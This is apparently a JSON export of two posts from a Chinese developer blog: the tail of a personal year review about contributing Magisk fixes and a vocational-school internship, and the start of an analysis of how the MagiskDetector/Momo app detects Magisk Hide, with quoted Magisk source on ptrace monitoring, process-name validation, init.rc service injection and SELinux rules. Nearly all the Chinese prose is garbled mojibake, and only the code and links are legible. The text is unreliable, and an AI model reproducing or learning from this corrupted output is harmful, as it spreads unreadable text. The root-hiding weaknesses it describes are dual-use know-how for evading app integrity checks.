ä½¿ç”¨äº†ä¸€ä¸ªæ²¡æœ‰åˆå§‹åŒ–çš„å˜é‡ï¼Œå®ƒå¯èƒ½æ˜¯éšæœºå€¼ã€‚æäº¤ä¿®å¤ä¹‹åï¼Œæ•´ä¸ªå†…ç¾¤éƒ½åœ¨å‘è¿™ä¹ˆä¸€å¥è¯ï¼šè¿™æ˜¯æˆ‘ä»¬ç¬¬ä¸€æ¬¡å’Œ magisk bug æ‰“äº¤é“ã€‚ä¹‹åï¼Œæˆ‘å¶ç„¶å‘ç°æˆ‘çš„å¤‡ç”¨æ‰‹æœºçº¢ç±³ 5 Plus ä¸Š magisk hide å®Œå…¨ä¸å·¥ä½œï¼Œä¸€å¼€å§‹æˆ‘ä»¥ä¸ºæ˜¯æˆ‘åˆ·çš„ lineageos çš„åŸå› ï¼Œä½†åæ¥æˆ‘åœ¨æˆ‘çš„ Pixel 3 ä¸Šä¹Ÿå¼€å§‹éšæœºé‡åˆ°è¿™ä¸ªé—®é¢˜ï¼Œè€Œä¸”ä¸æ–­æœ‰äººå‘æˆ‘åé¦ˆ MomoHider å·¥ä½œä¸æ­£å¸¸ï¼Œè°ƒæŸ¥åå‘ç°æ˜¯ magisk hide åäº†ã€‚æŸä¸€å¤©æˆ‘é™ä¸‹å¿ƒæ¥ï¼ŒæŠŠé‚£å°å¤‡ç”¨æœºå¼€æœºï¼Œè¿ä¸Šç”µè„‘ï¼Œä¸€ééå›çœ‹ç›¸å…³é€»è¾‘ä¸€ç‚¹ç‚¹æ”¹ä»£ç ï¼Œæœ€åè¢«æˆ‘ä¸€è¡Œä»£ç ä¿®å¥½äº†ã€‚ç„¶åæˆ‘å‘ magisk æäº¤äº†æˆ‘è‡ªå·±çš„ç¬¬ä¸€ä¸ª PRï¼Œå¾ˆå¯æƒœçš„æ˜¯å› ä¸º magisk åæ¥åˆ é™¤äº† magisk hideï¼Œæˆ‘çš„ PR æ²¡æœ‰è¢«åˆå¹¶ã€‚å¾€åçš„æ—¥å­é‡Œï¼Œæˆ‘ä»¬ç»™ Magisk æäº¤äº†å¤šæ¬¡ä»£ç ï¼Œä¿®å¤äº†å¤šä¸ª bugã€‚åœ¨ä¹‹å‰æˆ‘ç»å¯¹æƒ³ä¸åˆ°åœ¨å…¨ä¸–ç•ŒèŒƒå›´é‡Œè·å¾—æ•°äº¿ä½¿ç”¨çš„ Magisk ä¼šæœ‰è¿™ä¹ˆå¤š bugï¼Œä¹Ÿå¾ˆå¼€å¿ƒè‡ªå·±èƒ½å‚ä¸ä¸€ä¸ªè¿™ä¹ˆå¤§çš„é¡¹ç›®ï¼Œå¸Œæœ›è‡ªå·±åœ¨æ–°çš„ä¸€å¹´é‡Œå­¦åˆ°æ›´å¤šï¼Œæœ€å¥½æ‹¿åˆ° collaborator ï¼ˆå­¦ä¹ ï¼šä¸­èŒæ—¥å¸¸å¯’å‡ç»“æŸå›åˆ°å­¦æ ¡ä¹‹åï¼Œæˆ‘è¢«å‘ä¸‹æ¥çš„è¯¾ç¨‹è¡¨éœ‡æƒŠäº†ï¼šæˆ‘ä»¬çš„ä¸“ä¸šåå«è®¡ç®—æœºç½‘ç»œæŠ€æœ¯ï¼Œä½†æ˜¯ç¬¬äºŒå­¦æœŸæŠŠè¿™é—¨ä¸“ä¸šè¯¾ç»™å–æ¶ˆäº†ï¼Œç„¶ååŠ äº†ä»€ä¹ˆ å¸¸ç”¨å·¥å…·è½¯ä»¶ï¼ˆæ•™ä½ æ€ä¹ˆç”¨ QQ æ€ä¹ˆç”¨ç¾å›¾ç§€ç§€æ€ä¹ˆç”¨é…·ç‹—éŸ³ä¹è…¾è®¯è§†é¢‘ï¼‰è¿˜æœ‰ Photoshopã€‚å»é—®å­¦æ ¡è¿™æ˜¯æ€ä¹ˆå›äº‹ï¼Œå¾—åˆ°çš„ç­”å¤æ˜¯ï¼Œå­¦ç”Ÿä»¬åæ˜ è¿™é—¨è¯¾å¤ªéš¾å¬ä¸æ‡‚å°±å–æ¶ˆäº†ã€‚æ— è¯­è‡³æï¼Œä¹Ÿåªèƒ½ä¸€è¾¹ä¸Šç€è’å”è‡³æçš„è¯¾ï¼Œä¸€è¾¹è‡ªå­¦å‡†å¤‡é«˜èŒé«˜è€ƒã€‚å¹¸è¿çš„æ˜¯ï¼Œèƒ½åœ¨è¿™é‡Œç¢°åˆ°ä¸€èµ·ç¼–ç¨‹ä¸€èµ·å­¦ä¹ ä¸€èµ·é«˜è€ƒçš„ä¼™ä¼´ã€‚ä¸‰ä¸ªæœˆç”µå­å‚å®ä¹ ä¹Ÿç»“æŸäº†ï¼Œå¸Œæœ›è‡ªå·±æ–°çš„ä¸€å¹´èƒ½å…¨åŠ›å¤‡æˆ˜é«˜è€ƒ~å®ä¹ ï¼šè¢«æ¨å‘ç”µå­å‚çš„ä¸‰ä¸ªæœˆå…­æœˆä»½å¬è¯´è®¡ç®—æœºç­‰çº§è€ƒè¯•ä¹æœˆä»½å¼€å§‹æŠ¥åï¼Œåä¸€ç‚¹ä¸€åˆ°ç›´æ¥åœ¨è¯¾å ‚ä¸Šæ‹¿å‡ºç”µè„‘æŠ¥åã€‚ç°åœ¨æƒ³æ¥åº†å¹¸å½“æ—¶çš„è‡ªå·±çš„æœæ–­ï¼ŒéŸ¶å¤§è€ƒç‚¹åé¢å¾ˆå°‘è¢«è‡ªå·±æŠ¢åˆ°äº†ä¸€ä¸ªï¼Œè¿‡äº†ä¸€å¤©å†å»çœ‹åªå‰©ä¸‹æ¾å±±å­¦é™¢å¯ä»¥æŠ¥äº†~ ä½†æ˜¯ï¼Œç›´åˆ°æœŸæœ«æˆ‘ä»¬æ‰è¢«é€šçŸ¥ï¼Œä¸‹ä¸ªå­¦æœŸä¸€å¼€å§‹å°±è¦å»å®ä¹ ä¸‰ä¸ªæœˆã€‚åº¦è¿‡äº†ä¸€ä¸ªæš‘å‡ï¼Œå¼€å­¦äº†ï¼Œå­¦æ ¡æœç„¶æ²¡éª—æˆ‘ï¼Œå¾…äº†ä¸‰å¤©å°±ç›´æ¥åç€å¤§å·´å»äº†å‡ ç™¾å…¬é‡Œå¤–çš„åŸå¸‚ã€‚è¯´æ˜¯å®ä¹ ï¼Œå…¶å®ä¹Ÿå°±æ˜¯è®©å­¦ç”Ÿå»ç”µå­å‚å¹²äº›æ­£å¸¸äººéƒ½ä¼šå¹²çš„æ´»ã€‚åœ¨å‚é‡Œä¸Šç­ä¸‰ä¸ªæœˆï¼Œæˆ‘çš„æ„Ÿå—å°±æ˜¯è¿™ä¸æ˜¯äººå¹²çš„æ´»ï¼šç¨‹åºå‘˜å¤©å¤©æŠ±æ€¨çš„996åœ¨é‚£é‡Œæ ¹æœ¬å°±ä¸æ˜¯é—®é¢˜ï¼Œæˆ‘æœ€æ™šä¸€æ¬¡æ—©ä¸Šå…«ç‚¹ä¸Šç­ä¸Šåˆ°æ™šä¸Šåç‚¹åŠï¼Œè¿æ™šé¥­éƒ½æ²¡åƒï¼›å‡ ä¹æ²¡æœ‰å‡æ”¾ï¼Œä¸­ç§‹çš„ä¸€å¤©è¿˜æ˜¯è°ƒä¼‘è°ƒå‡ºæ¥çš„ï¼Œå›½åº†åªæœ‰ä¸‰å¤©å›è¶Ÿå®¶å‡ ä¹åœ¨ç¡è§‰ä¸­åº¦è¿‡ï¼›ç¬¬ä¸€ä¸ªæœˆè¿˜å¥½ï¼Œç¬¬äºŒä¸ªæœˆå¼€å§‹ä¸Šå¤œç­ä¸¤ç­å€’ï¼Œåˆ°åé¢åŸºæœ¬ä¸Šå°±æ˜¯éº»æœ¨çš„åœ¨é‚£é‡Œå¹²æ´»ï¼Œè„‘å­æ”¾ç©ºæ‰‹ä¸Šè¿˜åœ¨æœºæ¢°çš„åšé‚£äº›åŠ¨ä½œï¼Œæ„Ÿè§‰æ—¶é—´æµé€Ÿéƒ½ä¸ä¸€æ ·äº†ï¼Œæ´»è¿˜åœ¨æ‰‹ä¸Šå¹²ç€å¤–é¢å¤©å·²ç»äº®äº†ï¼›å›æ¥åŸºæœ¬ä¸Šæ‰‹æœºæ‹¿åœ¨æ‰‹é‡Œæ²¡å……ç”µååœ¨åºŠä¸Šå°±ç›´æ¥ç¡ç€äº†ã€‚ä¸‰ä¸ªæœˆä¸‹æ¥ï¼Œæ‹¿åˆ°æ‰‹å·¥èµ„ä¸åˆ°ä¸€ä¸‡ï¼Œè¿˜æŠŠä¹‹å‰çš„åŸºç¡€å‡ ä¹å¿˜å®Œäº†ï¼Œåˆ°å®ä¹ ç»“æŸå†™å®ä¹ æŠ¥å‘Šçš„æ—¶å€™è¿å­—éƒ½ä¸ä¼šå†™ã€‚ä½†å¥½åœ¨ï¼Œè¿™ä¸‰ä¸ªæœˆæˆ‘å·²ç»ç†¬è¿‡æ¥äº†ã€‚ç°åœ¨åªå¸Œæœ›è‡ªå·±èƒ½å¥½å¥½è‡ªå­¦ï¼Œå‚åŠ é«˜èŒé«˜è€ƒèƒ½è€ƒä¸Šå¥½çš„å¤§å­¦ï¼Œå¦åˆ™æŒ‰å›½å†…è¿™ä¸ªç¯å¢ƒï¼Œæˆ‘ä¼šå†éš¾çš„ä¸œè¥¿ä¹Ÿæ˜¯å»ç”µå­å‚çš„å‘½ã€‚åœ¨çŸ¥ä¹ä¸Šçœ‹è§ä¸€ä¸ªç«‹å¿—è¦è€ƒä¸Šæ·±èŒé™¢çš„å­¦å§ï¼ŒçœŸçš„å¾ˆåŠ±å¿—å‘€ï¼Œå¸Œæœ›è‡ªå·±ä¹Ÿèƒ½æ€ä¹ˆåŠªåŠ›~é™„ä¸Šé“¾æ¥ï¼šä¸­èŒç”Ÿé«˜èŒé«˜è€ƒè‡ªå­¦ï¼Œæ„Ÿè§‰æ‰¾ä¸åˆ°å¥½çš„æ–¹æ³•å­¦ä¹ æ–¹æ³•ï¼Œè¯¥æ€ä¹ˆåŠï¼Ÿ - è¯æ¢…çš„å›ç­” - çŸ¥ä¹åœ¨æ•…äº‹ç»“æŸä¹‹åçš„æ•…äº‹å›æ¥å­¦æ ¡ä¹‹åï¼Œå¾ˆè¿·èŒ«ï¼Œä¼¼ä¹åˆå›åˆ°äº†ä»¥å‰åœ¨å­¦æ ¡é‚£ç§çŠ¶æ€ï¼Œä¸Šå®Œå…­èŠ‚è¯¾å°±åœ¨è¯¾å®¤æˆ–è€…å®¿èˆèººç€ï¼Œé€çš„è¯•å·ä¹Ÿæ²¡åŠ¨åŠ›å»ç¿»ä¸€ä¸‹ã€‚æ˜¨å¤©æ™šä¸Šçœ‹ weishu ç›´æ’­ä¿® bugï¼ŒçŒ›ç„¶åˆæƒ³èµ·å½“æ—¶çš„æ¢¦æƒ³ï¼Œå½“æ—¶çš„æ¢¦å¤šä¹ˆå¤©çœŸå¤šä¹ˆç¾å¥½å•Šï¼Œé‚£å°±è®©æˆ‘ä»¬å»å®ç°å®ƒå§~ æˆ‘ä¸æ˜¯ä¸€ä¸ªæœ‰æ’å¿ƒçš„äººï¼Œæ‰€ä»¥å¦‚æœä½ æ„¿æ„çš„è¯ï¼Œè¯·ç›‘ç£æˆ‘å§ï¼Œå¸Œæœ›æˆ‘ä»¬èƒ½åœ¨ç¾å¥½çš„æœªæ¥ç›¸è§~~","categories":[],"tags":[{"name":"å¹´é‰´","slug":"å¹´é‰´","permalink":"https://blog.canyie.top/tags/%E5%B9%B4%E9%89%B4/"},{"name":"é—²èŠ","slug":"é—²èŠ","permalink":"https://blog.canyie.top/tags/%E9%97%B2%E8%81%8A/"}]},{"title":"æ£€æµ‹Magiskä¸Xposed","slug":"anti-magisk-xposed","date":"2021-05-01T05:23:44.000Z","updated":"2025-04-24T10:33:02.812Z","comments":true,"path":"2021/05/01/anti-magisk-xposed/","link":"","permalink":"https://blog.canyie.top/2021/05/01/anti-magisk-xposed/","excerpt":"ä¸ä¹…å‰ï¼Œå¼€å‘è€…Rikka &amp; vvb2060ä¸Šæ¶äº†ä¸€æ¬¾ç¯å¢ƒæ£€æµ‹åº”ç”¨Momoï¼ŒæŠŠå¤§å®¶ä¸€ç›´ä»¥æ¥ä¿¡ä»»çš„å„ç§åæ£€æµ‹æ‰‹æ®µå‡»å¾—ç²‰ç¢ã€‚ä¸‹é¢æˆ‘ä¼šé€šè¿‡éƒ¨åˆ†å·²å…¬å¼€çš„æºç ï¼Œåˆ†æè¿™ä¸ªå¯èƒ½æ˜¯å²ä¸Šæœ€å¼ºçš„ç¯å¢ƒæ£€æµ‹åº”ç”¨ã€‚","text":"ä¸ä¹…å‰ï¼Œå¼€å‘è€…Rikka &amp; vvb2060ä¸Šæ¶äº†ä¸€æ¬¾ç¯å¢ƒæ£€æµ‹åº”ç”¨Momoï¼ŒæŠŠå¤§å®¶ä¸€ç›´ä»¥æ¥ä¿¡ä»»çš„å„ç§åæ£€æµ‹æ‰‹æ®µå‡»å¾—ç²‰ç¢ã€‚ä¸‹é¢æˆ‘ä¼šé€šè¿‡éƒ¨åˆ†å·²å…¬å¼€çš„æºç ï¼Œåˆ†æè¿™ä¸ªå¯èƒ½æ˜¯å²ä¸Šæœ€å¼ºçš„ç¯å¢ƒæ£€æµ‹åº”ç”¨ã€‚æ£€æµ‹ Magiskè¿™ä¸€éƒ¨åˆ†åªåˆ†ææœ‰è¶£çš„ä¸œè¥¿ï¼Œå…³äºMagiskDetectorçš„å…¶ä»–ä¸€äº›å…·ä½“å®ç°ç»†èŠ‚è¯·ç›´æ¥æŸ¥çœ‹ https://github.com/vvb2060/MagiskDetector/blob/master/README_ZH.mdåMagisk Hideé¦–å…ˆåˆ†æMagisk Hideçš„åŸç†ï¼š1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980static void new_zygote(int pid) &#123; struct stat st; if (read_ns(pid, &amp;st)) return; auto it = zygote_map.find(pid); if (it != zygote_map.end()) &#123; // Update namespace info it-&gt;second = st; return; &#125; LOGD(\"proc_monitor: ptrace zygote PID=[%d]\\n\", pid); zygote_map[pid] = st; xptrace(PTRACE_ATTACH, pid); waitpid(pid, nullptr, __WALL | __WNOTHREAD); xptrace(PTRACE_SETOPTIONS, pid, nullptr, PTRACE_O_TRACEFORK | PTRACE_O_TRACEVFORK | PTRACE_O_TRACEEXIT); xptrace(PTRACE_CONT, pid);&#125;void proc_monitor() &#123; // çœç•¥... // First try find existing zygotes check_zygote(); for (int status;;) &#123; const int pid = waitpid(-1, &amp;status, __WALL | __WNOTHREAD); if (pid &lt; 0) &#123; // çœç•¥... &#125; if (!WIFSTOPPED(status) /* Ignore if not ptrace-stop */) DETACH_AND_CONT; int event = WEVENT(status); int signal = WSTOPSIG(status); if (signal == SIGTRAP &amp;&amp; event) &#123; unsigned long msg; xptrace(PTRACE_GETEVENTMSG, pid, nullptr, &amp;msg); if (zygote_map.count(pid)) &#123; // Zygote event switch (event) &#123; case PTRACE_EVENT_FORK: case PTRACE_EVENT_VFORK: PTRACE_LOG(\"zygote forked: [%lu]\\n\", msg); attaches[msg] = true; break; // ... &#125; &#125; else &#123; switch (event) &#123; case PTRACE_EVENT_CLONE: PTRACE_LOG(\"create new threads: [%lu]\\n\", msg); if (attaches[pid] &amp;&amp; check_pid(pid)) // è¿™é‡Œå°±ä¼šå®é™…hide magisk continue; break; // ... &#125; &#125; xptrace(PTRACE_CONT, pid); &#125; else if (signal == SIGSTOP) &#123; if (!attaches[pid]) &#123; // Double check if this is actually a process attaches[pid] = is_process(pid); &#125; if (attaches[pid]) &#123; // This is a process, continue monitoring PTRACE_LOG(\"SIGSTOP from child\\n\"); xptrace(PTRACE_SETOPTIONS, pid, nullptr, PTRACE_O_TRACECLONE | PTRACE_O_TRACEEXEC | PTRACE_O_TRACEEXIT); xptrace(PTRACE_CONT, pid); &#125; // ... &#125; // ... &#125;&#125;å¯ä»¥çœ‹è§ï¼Œmagisk hideé€šè¿‡ptraceæœºåˆ¶è·Ÿè¸ªæ‰€æœ‰zygoteï¼Œé€šè¿‡cat /proc/&lt;pid&gt;/statusçœ‹è§TracerPidä¹Ÿå¯ä»¥è¯å®æˆ‘ä»¬çš„å‘ç°ã€‚å­è¿›ç¨‹çš„ç¬¬ä¸€ä¸ªçº¿ç¨‹åˆ›å»ºæ—¶ï¼Œå¯¹å…¶å®é™…è¿›è¡Œhideã€‚123456789101112131415161718192021222324252627282930313233343536373839404142434445static bool check_pid(int pid) &#123; char path[128]; char cmdline[1024]; struct stat st; sprintf(path, \"/proc/%d/cmdline\", pid); if (auto f = open_file(path, \"re\")) &#123; fgets(cmdline, sizeof(cmdline), f.get()); &#125; else &#123; // Process died unexpectedly, ignore detach_pid(pid); return true; &#125; if (cmdline == \"zygote\"sv || cmdline == \"zygote32\"sv || cmdline == \"zygote64\"sv || cmdline == \"usap32\"sv || cmdline == \"usap64\"sv) return false; // é€šè¿‡uidå’Œè¿›ç¨‹ååˆ¤æ–­æ˜¯å¦éœ€è¦hide if (!is_hide_target(uid, cmdline)) goto not_target; // å¦‚æœå‘½åç©ºé—´æœªåˆ†ç¦»ï¼Œè¿›è¡Œunmountä¼šå½±å“åˆ°zygoteä»è€Œå½±å“åˆ°è€Œåå¯åŠ¨çš„æ‰€æœ‰è¿›ç¨‹ï¼Œè·³è¿‡ read_ns(pid, &amp;st); for (auto &amp;zit : zygote_map) &#123; if (zit.second.st_ino == st.st_ino &amp;&amp; zit.second.st_dev == st.st_dev) &#123; // ns not separated, abort LOGW(\"proc_monitor: skip [%s] PID=[%d] UID=[%d]\\n\", cmdline, pid, uid); goto not_target; &#125; &#125; // Detach but the process should still remain stopped // The hide daemon will resume the process after hiding it LOGI(\"proc_monitor: [%s] PID=[%d] UID=[%d]\\n\", cmdline, pid, uid); detach_pid(pid, SIGSTOP); hide_daemon(pid); return true;not_target: PTRACE_LOG(\"[%s] is not our target\\n\", cmdline); detach_pid(pid); return true;&#125;hide_daemoné‡Œä¼šforkä¸€ä¸ªæ–°çš„è¿›ç¨‹ï¼Œsetnsåˆ°ç›®æ ‡è¿›ç¨‹çš„å‘½åç©ºé—´ï¼Œç„¶åå¸è½½æ‰€æœ‰è¢«magiskä¿®æ”¹è¿‡çš„ä¸œè¥¿ã€‚æ³¨æ„ï¼Œé‡Œé¢æœ‰ä¸ªifåˆ¤æ–­ï¼Œå¦‚æœå‘½åç©ºé—´æœªåˆ†ç¦»ï¼Œè¿›è¡Œunmountä¼šå½±å“åˆ°zygoteä»è€Œå½±å“åˆ°è€Œåå¯åŠ¨çš„æ‰€æœ‰è¿›ç¨‹ï¼Œé‚£ä¹ˆç›´æ¥è·³è¿‡ã€‚è¿™å°±æ˜¯Magisk Hideçš„ç¬¬ä¸€ä¸ªé—®é¢˜ã€‚åœ¨MagiskDetectorçš„å®ç°ç»†èŠ‚ä»‹ç»é‡Œè¯´æ˜äº†æœ‰ä¸¤ç§æƒ…å†µç¬¦åˆï¼šä¸€ä¸ªæ˜¯åº”ç”¨appopsçš„è¯»å–å­˜å‚¨ç©ºé—´opä¸ºå¿½ç•¥ï¼Œä¸€ä¸ªæ˜¯è¯¥è¿›ç¨‹ä¸ºéš”ç¦»è¿›ç¨‹ã€‚æ­¤å¤„çš„éš”ç¦»è¿›ç¨‹æŒ‡çš„å°±æ˜¯é…ç½®äº† android:isolatedProcess=&quot;true&quot;çš„serviceã€‚è€Œä¸”ï¼ŒAndroid 10ä¸Šè¿˜æœ‰ä¸€ç§æœ‰ï¼ˆç§ï¼‰è¶£ï¼ˆè´§ï¼‰çš„ä¸œè¥¿ï¼Œå«åšApp Zygoteï¼Œè¿™ç©æ„å‡ ä¹æ‰¾ä¸åˆ°è¯´æ˜ï¼Œå”¯ä¸€çš„æ–‡æ¡£å°±æ˜¯ZygotePreloadï¼Œæ„Ÿè§‰æ›´åƒè°·æ­Œç»™Chromeå¼€çš„åé—¨ã€‚å’³å’³ï¼Œåé¢˜äº†ï¼Œè¿™ç©æ„è¿è¡Œåœ¨ä¸€ä¸ªå•ç‹¬çš„è¿›ç¨‹ï¼Œä¹Ÿä¸ä¼šåˆ†ç¦»å‘½åç©ºé—´ã€‚ç›®å‰å·²çŸ¥è§£å†³æ­¤é—®é¢˜çš„æ–¹æ¡ˆæœ‰ä¸¤ç§ï¼Œç¬¬ä¸€ç§å°±æ˜¯Magisk Liteï¼Œç›´æ¥å¯¹zygoteå¸è½½è€Œéåº”ç”¨ï¼Œä½†è¿™ç§æ–¹å¼ä¼šç ´åå¾ˆå¤šç°æœ‰æ¨¡å—ï¼›å¦ä¸€ç§å°±æ˜¯åˆ©ç”¨è¿›ç¨‹æ³¨å…¥ï¼Œå¼ºè¡Œåˆ†ç¦»å‘½åç©ºé—´ï¼Œå…¸å‹çš„è§£å†³æ–¹æ¡ˆæ˜¯Riru-Unshareã€‚å¥½çš„ï¼Œè¿™ä¸ªé—®é¢˜è¯´å®Œäº†ï¼Œä¸‹ä¸€ä¸ª~~åœ¨ä¸Šé¢çš„åˆ¤æ–­ä»£ç é‡Œï¼Œè¯»å–è¿›ç¨‹åéƒ¨åˆ†ï¼Œæ˜¯é€šè¿‡è¯»å–/proc/&lt;pid&gt;/cmdlineè¿›è¡Œåˆ¤æ–­çš„ï¼›è€Œå®é™…ä¸Šï¼Œè¿™ä¸ªæ–‡ä»¶å†…å®¹çš„é•¿åº¦æ˜¯æœ‰é™åˆ¶çš„ï¼è¿™è¡¨ç¤ºï¼Œå½“é…ç½®çš„è¿›ç¨‹åè¿‡é•¿æ—¶ï¼ŒMagiskè¯»å–åˆ°çš„è¿›ç¨‹åä¼šä¸åŒ¹é…ï¼Œä»è€Œè·³è¿‡è¿™ä¸ªè¿›ç¨‹ï¼è¿™ä¹Ÿå°±æ˜¯Issue #3997çš„åŸç†ã€‚Magiskå¯¹æ­¤åšäº†ä¸´æ—¶ä¿®å¤ï¼šå¦‚æœå‰ç¼€åŒ¹é…å°±ç›´æ¥è®¤ä¸ºæ˜¯ç›®æ ‡è¿›ç¨‹è¿›è¡Œhideã€‚å®Œäº†å—ï¼Ÿæ²¡æœ‰ã€‚ä¸‹ä¸€ä¸ªé—®é¢˜åœ¨æŠŠè¿›ç¨‹æ·»åŠ åˆ°æ•°æ®åº“çš„æ—¶å€™ï¼š123456789101112131415161718192021222324252627static int add_list(const char *pkg, const char *proc) &#123; if (proc[0] == '\\0') proc = pkg; if (!validate(pkg) || !validate(proc)) return HIDE_INVALID_PKG; // ...&#125;static bool validate(const char *s) &#123; if (strcmp(s, ISOLATED_MAGIC) == 0) return true; bool dot = false; for (char c; (c = *s); ++s) &#123; if ((c &gt;= 'A' &amp;&amp; c &lt;= 'Z') || (c &gt;= 'a' &amp;&amp; c &lt;= 'z') || (c &gt;= '0' &amp;&amp; c &lt;= '9') || c == '_' || c == ':') &#123; continue; &#125; if (c == '.') &#123; dot = true; continue; &#125; return false; &#125; return dot;&#125;è¿™é‡Œä¼šå¯¹åŒ…åå’Œè¿›ç¨‹åè¿›è¡Œæ£€æŸ¥ï¼Œå¦‚æœå«æœ‰éæ³•å­—ç¬¦æˆ–è€…æ²¡æœ‰ç‚¹ï¼Œé‚£ä¹ˆè®¤ä¸ºæ˜¯æ— æ•ˆè¿›ç¨‹ã€‚Androidå¯¹åŒ…åæœ‰ä¸¥æ ¼è§„å®šï¼Œé€šè¿‡android:processé…ç½®çš„è¿›ç¨‹åä¹Ÿæœ‰è§„å®šï¼Œä¼¼ä¹æ— æ³•ä½œå¦–ï¼Ÿç„¶è€Œé—®é¢˜ç¡®å®å‘ç”Ÿäº†ï¼šIssue #4176ã€‚ç»è¿‡æ£€æŸ¥ï¼Œè¯¥åº”ç”¨ç¨‹åºä½¿ç”¨äº†éš”ç¦»è¿›ç¨‹æ¥æ£€æŸ¥Magiskï¼Œä½†ä¸åŒçš„æ˜¯ï¼Œå…¶æœåŠ¡ç±»åå«æœ‰éæ³•å­—ç¬¦ï¼ˆJavaå¹¶æ²¡æœ‰é™åˆ¶ç±»åï¼‰ï¼Œä¸”Android 10+ï¼Œç³»ç»Ÿä¼šç»™éš”ç¦»è¿›ç¨‹çš„åå­—è¿½åŠ ç±»åï¼ˆhttps://t.me/vvb2060Channel/441ï¼‰ï¼Œå¯¼è‡´æ£€æŸ¥ä¸é€šè¿‡ã€‚è§£å†³æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œä¿®æ”¹ä¸€ä¸‹è¿™ä¸ªvalidateå°±å¥½ã€‚æ£€æµ‹init.rcçš„ä¿®æ”¹ï¼šéšæœºåªæœ‰åœ¨æ— æ³•éå†çš„æƒ…å†µä¸‹æ‰æœ‰æ•ˆã€‚å¦‚æœå¯ä»¥éå†ï¼Œä½¿ç”¨ç»Ÿè®¡æ–¹æ³•å³å¯å‡†ç¡®æ‰¾å‡ºæ¯æ¬¡éƒ½ä¸ä¸€æ ·çš„ä¸œè¥¿ã€‚è¿™å¥è¯çœ‹ç€æœ‰ç‚¹è¿·æƒ‘ï¼Œçœ‹çœ‹Magiskæºç å°±çŸ¥é“äº†ã€‚https://github.com/topjohnwu/Magisk/blob/master/native/jni/init/rootdir.cpp#L45ï¼š1234567// Inject Magisk rc scriptschar pfd_svc[16], ls_svc[16], bc_svc[16];gen_rand_str(pfd_svc, sizeof(pfd_svc));gen_rand_str(ls_svc, sizeof(ls_svc));gen_rand_str(bc_svc, sizeof(bc_svc));LOGD(\"Inject magisk services: [%s] [%s] [%s]\\n\", pfd_svc, ls_svc, bc_svc);fprintf(rc, MAGISK_RC, tmp_dir, pfd_svc, ls_svc, bc_svc);Magiskåœ¨å¯åŠ¨æ—¶ä¼šå¾€init.rcä¸­æ³¨å…¥ä¸‰ä¸ªè‡ªå·±çš„æœåŠ¡ï¼Œç”¨æ¥æ¥æ”¶post-fs-dataç­‰äº‹ä»¶ï¼›è¿™ä¸‰ä¸ªæœåŠ¡çš„åç§°æ˜¯åšäº†éšæœºåŒ–å¤„ç†ï¼Œè€Œinitå®é™…ä¸Šä¼šå¾€ç³»ç»Ÿå±æ€§é‡Œæ·»åŠ åƒinit.svc.&lt;service name&gt;è¿™æ ·å­çš„å±æ€§ï¼Œå€¼æ˜¯runningæˆ–è€…stoppedï¼Œä»¥å‘Šè¯‰å…¶ä»–è¿›ç¨‹è¯¥æœåŠ¡çš„çŠ¶æ€ã€‚MagiskDetectorå°±åˆ©ç”¨äº†è¿™ä¸ªæœºåˆ¶ï¼Œéå†ç³»ç»Ÿå±æ€§è®°å½•æ‰€æœ‰æœåŠ¡åï¼Œç„¶ååœ¨ç”¨æˆ·é‡å¯ä¹‹åå°±èƒ½çŸ¥é“æ˜¯å¦æœ‰æœåŠ¡çš„åç§°å‘ç”Ÿäº†å˜åŒ–ã€‚æ£€æµ‹SELinuxè§„åˆ™https://github.com/topjohnwu/Magisk/blob/master/native/jni/magiskpolicy/rules.cpp12345678910111213141516// Allow these processes to access MagiskSUconst char *clients[] &#123; \"init\", \"shell\", \"appdomain\", \"zygote\" &#125;;for (auto type : clients) &#123; if (!exists(type)) continue; allow(type, SEPOL_PROC_DOMAIN, \"unix_stream_socket\", \"connectto\"); allow(type, SEPOL_PROC_DOMAIN, \"unix_stream_socket\", \"getopt\"); // Allow termios ioctl const char *pts[] &#123; \"devpts\", \"untrusted_app_devpts\" &#125;; for (auto pts_type : pts) &#123; allow(type, pts_type, \"chr_file\", \"ioctl\"); if (db-&gt;policyvers &gt;= POLICYDB_VERSION_XPERMS_IOCTL) allowxperm(type, pts_type, \"chr_file\", \"0x5400-0x54FF\"); &#125;&#125;ç”±äºMagiskå…è®¸äº†ä¸€äº›ioctlï¼Œæ‰€ä»¥ä¼šè¢«æ£€æµ‹åˆ°ã€‚è§£å†³æ–¹æ³•æ˜¯ï¼Œæ›´æ–°åˆ°Android 8+ &amp; Magisk 21+ï¼ŒMagiskä¼šè‡ªåŠ¨ä½¿ç”¨æ–°çš„è§„åˆ™ã€‚åŒæ—¶ï¼Œä¸ä»…ä»…æ˜¯Magiskè‡ªèº«çš„é”…ï¼Œé”™è¯¯ä½¿ç”¨SELinuxä¹Ÿå¯èƒ½ä¼šé€ æˆMagiskè¢«è½»æ˜“æ£€æµ‹åˆ°ã€‚ä¸¾ä¾‹ï¼š12type(SEPOL_PROC_DOMAIN, \"domain\");type(SEPOL_FILE_TYPE, \"file_type\");åŠ äº†ä¸¤ä¸ªmagiskè‡ªå·±çš„domainï¼Œçœ‹èµ·æ¥æ²¡é—®é¢˜ï¼Œä½†æ˜¯ï¼Œå¦‚æœç”¨æˆ·æŠŠselinuxè®¾ç½®ä¸ºå®½å®¹æ¨¡å¼ï¼ˆpermissiveï¼‰ï¼Œé‚£ä¹ˆappå¯ä»¥è¿›è¡Œselinux_check_access()ï¼ˆjavaå±‚å¯¹åº”çš„æ¥å£ä¸ºSELinux.checkSELinuxAccess()ï¼‰ï¼Œå¦‚æœè·å¾—å…è®¸ï¼Œé‚£ä¹ˆä»£è¡¨è¿™ä¸ªdomainå­˜åœ¨ =&gt; å®‰è£…äº†Magiskã€‚ä¸åªæ˜¯å®½å®¹æ¨¡å¼ï¼Œå¦‚æœæ·»åŠ äº†allow appdomain xxx relabelfromä¹‹ç±»çš„è§„åˆ™ï¼Œåˆæ²¡æœ‰deny appdomain magisk_file 